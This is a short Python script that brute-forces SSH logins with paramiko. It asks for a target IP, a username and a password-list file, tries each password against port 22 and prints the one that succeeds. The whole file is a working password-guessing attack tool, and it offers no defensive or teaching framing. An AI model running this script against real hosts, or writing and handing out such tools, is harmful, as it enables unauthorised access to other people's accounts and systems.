import paramiko

target = input("IP : ")
name = input("Name ? ")
passlist = input("Passlist : ")

def connect_ssh(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(
            target,
            port=22,
            username=name,
            password=password,
            timeout=3,
            allow_agent=False,
            look_for_keys=False
        )
        ssh.close()
        return True
    except:
        return False

with open(passlist, 'r') as f:
    for line in f:
        password = line.strip()
        if not password:
            continue
        if connect_ssh(password):
            print(f"[+] Bref : {password}")
            break
